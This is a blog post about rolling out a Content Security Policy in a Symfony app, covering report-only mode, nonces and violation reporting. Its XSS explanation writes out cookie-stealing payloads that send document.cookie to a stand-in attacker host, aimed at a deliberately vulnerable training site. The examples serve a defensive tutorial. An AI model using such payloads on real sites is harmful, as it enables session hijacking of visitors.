--- 
title: 'CSP: Can See Purpose'
categories: security
tags: http-headers web-security
---

What is a Content Security Policy? What problems does it solve? How can I use it to make my site
more secure? How do I implement it without breaking my site? These are the questions I'm aiming to
answer by sharing my experience of implementing a strict Content Security Policy while not breaking
anything.


## What is a Content Security Policy (CSP)

When setting up the infrastructure for my startup, I came across
[securityheaders.com](https://securityheaders.com) which scans any website and ranks it's security
based on which HTTP headers it returns. There are many changes you should make to your HTTP headers
to increase your security, some new headers you should add, and some you should remove. One of these
headers is the Content Security Policy.


## What problems does it solve

The browser will only load approved content defined in a Content Security Policy header if one is
present. If not, it will load anything it's told to. This default behaviour is the basis for many
cyber attacks today, the most common of which is an XSS (Cross Site Scripting) attack.

The basics of an XSS attack is when at attacker will trick the browser into loading untrusted
content in order to attack a websites visitors. As an example, take a look at
[hack-yourself-first.com](http://hack-yourself-first.com) which is a great website set up by [Troy
Hunt](https://www.troyhunt.com) for everyone to learn how to secure their site by hacking another.

Do a search on the site and you'll see your seach terms reflected back to you, and in the source 
you'll find:

```html
<script>
  // ...

  $('#searchTerm').val('Nissan');
</script>
```

But, if you search for 

```
');location.href='http://evilcyberhacker.com?cookies='%2BencodeURIComponent(document.cookie);//'
```

the source will contain:

```html
<script>
  // ...

  $('#searchTerm').val('');location.href='http://evilcyberhacker.com?cookies='+encodeURIComponent(document.cookie);//');
</script>
```

Which means you can send the following link to a user, and they will be redirected to evilcyberhacker.com and
send along their cookies in the URL, for the attacker to find in their server logs.

```
http://hack-yourself-first.com/Search?searchTerm=');location.href='http://evilcyberhacker.com?cookies='%2BencodeURIComponent(document.cookie);//'
```

The only reason this attack is possible, is because the browser loads and executes the inline script
tag. Another XSS attack could be adding a comment with this as the comment body:

```html
<script src="http://evilcyberhacker.com/stealcookies.js" /> Wow! What a cool website.
```

Then when a user visits the page, the browser will automatically load and run `stealcookies.js`,
which doesn't sound plesant.


## How will it make my site more secure?

So you're probably thinking that you can just sanitise your input and output and then you're not
vulnerable to XSS attacks, meaning you don't need to worry about a CSP. And you would be almost right!
Even if your site is entirely rock-solid and it's impossible for someone to trick a browser
viewing your site into loading an untrusted script, there are still issues that a CSP will solve:

1. Once your site gets big enough, it's hard to ensure that every single input/output is sanitised
   correctly. Both the above examples must be sanitised in different ways, because they're loaded in
   different contexts (javascript vs. html). __The larger your site gets, the more likely it is that
   you'll miss something, leaving your users vulnerable__.
2. Your users will have all sorts of dodgey browser extensions installed, from free VPN's such as
   Hola to extensions that allow you to stream torrent videos while they download. These extensions
   has almost unlimited access to the DOM.

A properly implemented CSP is essentially a blanket ban on not only XSS attacks, but any attack that
relies on the browser loading untrusted assets. In order for an attacker to compromise your CSP
protected site, they must first gain access to the approved sources you list in your policy.

Yes, you should still write secure code and not leave XSS flaws everywhere. But adding a good CSP
closes off extra avenues of attack (such as dodgy browser extensions) and also covers your back if
you slip up and don't sanitise some output.


### CSP basics

A CSP header contains a list of "directives", with each directive holding a list trusted sources.
Some of the common directives are:

- `script-src`  - where we can load javascript from
- `style-src`   - where we can load CSS from
- `image-src`   - where we can load images from
- `font-src`    - where we can load fonts from
- `connect-src` - where scripts can load urls from (ie. Fetch, XMLHttpRequest, etc)
- `default-src` - applied to every directive not explicitly specified
- `block-all-mixed-content`   - prevents assets being loaded over HTTP
- `upgrade-insecure-requests` - forces assets to be loaded over HTTPS
- `report-uri` - a location to report all policy violations

(for a more in depth view, see the [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP))

A basic CSP header looks like this:

```
Content-Security-Policy: default-src 'none'; script-src: 'self'; style-src: 'self'
fonts.googleapis.com; image-src: instagram.com; report-uri: example.report-uri.com/r/d/csp/enforce
```

Which allows:

- JavaScript to be loaded only from the current host (ie. your site)
- CSS to be loaded from the current host and fonts.googleapis.com
- Images to be loaded only from Instagram
- Everything else is not allowed to be loaded at all, not even from the current host

And if anything violates this policy (ie. tries to load assets from an untrusted source), the
violation will be reported to `example.report-uri.com/r/d/csp/enforce`. You can either implement an
endpoint in your own app that accepts and saves the reports, or you can use a service such as
[report-uri.com](https://report-uri.com/) which is free for up to 10,000 reports per month.

You could set `default-src` to `'self'`, then everything not specified would be able to be loaded
from your site, but it's a good idea to set it to `'none'` and explicitly list each directive your
site requires.


### CSP report-only

You can place your CSP in report only mode by using the `Content-Security-Policy-Report-Only` header
instead of `Content-Security-Policy`. This means the browser will raise an error in the console for
every violation and also send a report to the `report-uri` if it's specified. This is the key to not
breaking your site, and also to upgrading your CSP over time. This way you roll the changes into
production, and monitor the reports to make sure you haven't missed anything. Once you're happy that
you've allowed all the sources you trust, you can switch to the `Content-Security-Policy` header and
you're golden!

You can also specify both headers at the same time, which will cause the browser to apply the
report-only policy first, then the enforced policy. So you can test any changes to your CSP before
enforcing them.


### Browser incompatibilities

We're working in the web, of course the are browser incompatibilities, and of course the problem is
Internet Explorer. IE doesn't support `Content-Security-Policy` but instead uses the
`X-Content-Security-Policy` header, it does however support most of the standard so you can use the
same value for both headers. As far as browser incompatibilities go, it's definitely not the worst.


## How do I implement it without breaking my site?

A mis-configured CSP can easily break your site. If you don't approve the sources that you depend
on, then your site just won't work. So I'm going to walk you through the steps I took to
successfully implement our CSP without breaking anything (much).


I started out by adding the header to my nginx config:

```nginx
add_header Content-Security-Policy-Report-Only "default-src: 'none'; ..."
```

A problem quickly arose when I needed to change the header, meaning I had to rebuild my dev vm as
well as staging and production just to allow fonts.googleapis.com. Setting the header in app code 
makes changes easier to deploy. Doing this manually with Symfony would require using the PHP 
[header](https://secure.php.net/manual/en/function.header.php) function, or
setting it on every Symfony Response:

```php
<?php

// Vanilla PHP
header('Content-Security-Policy-Report-Only "default-src \'none\'; ..."');

// Symfony Response
$response->headers->set('Content-Security-Policy-Report-Only', "default-src 'none'; ...','");
```

But this very quickly gets large and unmaintainable, our current CSP is hundreds of characeters
long. So I turned to the
[NelmioSecurityBundle](https://github.com/nelmio/NelmioSecurityBundle#content-security-policy) for
Symfony, which allows me to use nice Yaml config.


### Step one - deny all

```yaml
nelmio_security:
    csp:
        report:
            block-all-mixed-content: true
            default-src: ['none']
```

Which gave me a lot of console errors, as expected:

![PHP Version Usage]({{ "/assets/images/csp-errors.png" }})


### Step two - allow the easy things

We get this helpful list of every asset that the site requires, so now we add them. This is where
it's helpful to find the documentation for your 3rd party dependencies. They will often list
everything you need to add to your CSP to work with them. In our case we use:

- [Sentry](https://forum.sentry.io/t/required-content-security-policy/4484/3)
- [FullStory](https://help.fullstory.com/spp-ref/can-i-use-content-security-policy-csp-with-fullstory)
- [Intercom](https://www.intercom.com/help/configure-intercom-for-your-product-or-site/staying-secure/using-intercom-with-content-security-policy)

```yaml
nelmio_security:
    csp:
        report:
            block-all-mixed-content: true
            default-src: ['none']
            script-src:
                - 'self'
                ...
            style-src:
                - 'self'
                ...
            font-src:
                - 'self'
                ...
            img-src:
                - 'self'
                ...
            connect-src:
                - 'self'
...
```


### Step three - deal with inline scripts

Now that I had trimmed down most of the noise, I noticed that there were a lot of `unsafe-inline`
scripts being executed. This is for every inline `<script>` tag that we had. That's where the 
`nonce` comes in.

{% raw %}
```html
<script nonce="{{ csp_nonce('script') }}">
    ...
</script>
```
{% endraw %}

This will generate a crypotographically secure nonce (number used only once) and attach it to the
inline scripts. It then adds the nonce to the CSP header, to tell the browser that any inline script
with this nonce is trusted.

```
Content-Security-Policy script-src: 'nonce-67eab753ab3f0a713e02b07421dae6b7' ...
```


### Step four - webpack and unsafe-eval

It this point I turned my attention to the obscene amount of errors coming through about using
`unsafe-eval`. Our webpack config uses `devtool: eval` in order to speed up development builds. 
So I allowed unsafe eval in dev but not in production - that would negate the entire 
point of the CSP.


### Step five - report-uri and deploy

Now that I wasn't getting any errors in dev, I signed up for [report-uri.com](https://report-uri.com),
added it to my config and deployed to staging and production.

```yaml
nelmio_security:
    csp:
        report:
            report-uri: https://example.report-uri.com/r/d/csp/reportOnly
            block-all-mixed-content: true
            default-src: ['none']
            script-src:
...
```

### Step six - monitor

Checking report-uri revealed that every page load was getting hundreds of errors
in production. The investigation uncovered that a couple of problems:

- our webpack config was running the production build with `devtool: eval` enabled 😲
    - easily solved by changing the config
- we were using `<a href="javascript:void(0)">` to make links work like buttons to deal with
    different browser inconsistencies
    - solved by using `tabindex="0"` and dropping the `href` attribute


### Step 7 - enforce

After a week or so in production we weren't getting any more CSP violations coming through, so
I switched the CSP header into enforce and rescanned our site on
[securityheaders.com](https://securityheaders.com) to enjoy the A+ rating!


## Conclusion

The Content-Security-Policy header is very powerful, allowing you to whitelist trusted sources to
load assets from. This essentially puts a blanket ban on some of the most common cyber attacks.
If implemented improperly it can render your website useless, but with a little patience you can
easily add one to your site without breaking anything!
